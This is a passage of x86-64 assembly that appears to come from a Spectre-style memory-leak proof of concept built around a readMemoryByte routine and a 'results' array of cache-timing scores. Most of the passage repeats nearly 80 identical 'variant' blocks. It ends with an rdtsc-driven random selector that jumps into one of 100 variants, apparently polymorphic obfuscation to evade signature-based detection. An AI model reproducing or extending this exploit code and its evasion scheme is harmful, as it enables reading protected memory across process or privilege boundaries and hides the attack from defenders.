	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 23
.LreadMemoryByte_win3_var23:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 24
.LreadMemoryByte_win3_var24:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 25
.LreadMemoryByte_win3_var25:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 26
.LreadMemoryByte_win3_var26:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 27
.LreadMemoryByte_win3_var27:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 28
.LreadMemoryByte_win3_var28:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 29
.LreadMemoryByte_win3_var29:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 30
.LreadMemoryByte_win3_var30:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 31
.LreadMemoryByte_win3_var31:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 32
.LreadMemoryByte_win3_var32:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 33
.LreadMemoryByte_win3_var33:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 34
.LreadMemoryByte_win3_var34:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 35
.LreadMemoryByte_win3_var35:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 36
.LreadMemoryByte_win3_var36:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 37
.LreadMemoryByte_win3_var37:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 38
.LreadMemoryByte_win3_var38:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 39
.LreadMemoryByte_win3_var39:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 40
.LreadMemoryByte_win3_var40:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 41
.LreadMemoryByte_win3_var41:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 42
.LreadMemoryByte_win3_var42:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 43
.LreadMemoryByte_win3_var43:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 44
.LreadMemoryByte_win3_var44:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 45
.LreadMemoryByte_win3_var45:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 46
.LreadMemoryByte_win3_var46:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 47
.LreadMemoryByte_win3_var47:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 48
.LreadMemoryByte_win3_var48:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 49
.LreadMemoryByte_win3_var49:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 50
.LreadMemoryByte_win3_var50:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 51
.LreadMemoryByte_win3_var51:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 52
.LreadMemoryByte_win3_var52:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 53
.LreadMemoryByte_win3_var53:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 54
.LreadMemoryByte_win3_var54:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 55
.LreadMemoryByte_win3_var55:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 56
.LreadMemoryByte_win3_var56:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 57
.LreadMemoryByte_win3_var57:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 58
.LreadMemoryByte_win3_var58:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 59
.LreadMemoryByte_win3_var59:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 60
.LreadMemoryByte_win3_var60:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 61
.LreadMemoryByte_win3_var61:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 62
.LreadMemoryByte_win3_var62:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 63
.LreadMemoryByte_win3_var63:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 64
.LreadMemoryByte_win3_var64:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 65
.LreadMemoryByte_win3_var65:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 66
.LreadMemoryByte_win3_var66:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 67
.LreadMemoryByte_win3_var67:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 68
.LreadMemoryByte_win3_var68:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 69
.LreadMemoryByte_win3_var69:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 70
.LreadMemoryByte_win3_var70:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 71
.LreadMemoryByte_win3_var71:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 72
.LreadMemoryByte_win3_var72:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 73
.LreadMemoryByte_win3_var73:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 74
.LreadMemoryByte_win3_var74:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 75
.LreadMemoryByte_win3_var75:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 76
.LreadMemoryByte_win3_var76:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 77
.LreadMemoryByte_win3_var77:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 78
.LreadMemoryByte_win3_var78:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 79
.LreadMemoryByte_win3_var79:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 80
.LreadMemoryByte_win3_var80:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 81
.LreadMemoryByte_win3_var81:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 82
.LreadMemoryByte_win3_var82:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 83
.LreadMemoryByte_win3_var83:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 84
.LreadMemoryByte_win3_var84:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 85
.LreadMemoryByte_win3_var85:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 86
.LreadMemoryByte_win3_var86:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 87
.LreadMemoryByte_win3_var87:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 88
.LreadMemoryByte_win3_var88:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 89
.LreadMemoryByte_win3_var89:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 90
.LreadMemoryByte_win3_var90:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 91
.LreadMemoryByte_win3_var91:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 92
.LreadMemoryByte_win3_var92:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 93
.LreadMemoryByte_win3_var93:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 94
.LreadMemoryByte_win3_var94:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 95
.LreadMemoryByte_win3_var95:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 96
.LreadMemoryByte_win3_var96:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 97
.LreadMemoryByte_win3_var97:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 98
.LreadMemoryByte_win3_var98:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 99
.LreadMemoryByte_win3_var99:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
.LreadMemoryByte_win3_continue:
	addq	$32, %rsp
	cltq
	leaq	0(,%rax,4), %rcx
	leaq	results.0(%rip), %rax
	movl	(%rcx,%rax), %eax
	cmpl	%eax, %edx
	jl	.L22
.L23:
	movl	-96(%rbp), %eax
	movl	%eax, -88(%rbp)
.L22:
	addl	$1, -96(%rbp)
.L19:
	subq	$32, %rsp
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$100, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win2_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win2_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win2_var2
	cmpl	$3, %eax
	je	.LreadMemoryByte_win2_var3
	cmpl	$4, %eax
	je	.LreadMemoryByte_win2_var4
	cmpl	$5, %eax
	je	.LreadMemoryByte_win2_var5
	cmpl	$6, %eax
	je	.LreadMemoryByte_win2_var6
	cmpl	$7, %eax
	je	.LreadMemoryByte_win2_var7
	cmpl	$8, %eax
	je	.LreadMemoryByte_win2_var8
	cmpl	$9, %eax
	je	.LreadMemoryByte_win2_var9
	cmpl	$10, %eax
	je	.LreadMemoryByte_win2_var10
	cmpl	$11, %eax
	je	.LreadMemoryByte_win2_var11
	cmpl	$12, %eax
	je	.LreadMemoryByte_win2_var12
	cmpl	$13, %eax
	je	.LreadMemoryByte_win2_var13
	cmpl	$14, %eax
	je	.LreadMemoryByte_win2_var14
	cmpl	$15, %eax
	je	.LreadMemoryByte_win2_var15
	cmpl	$16, %eax
	je	.LreadMemoryByte_win2_var16
	cmpl	$17, %eax
	je	.LreadMemoryByte_win2_var17
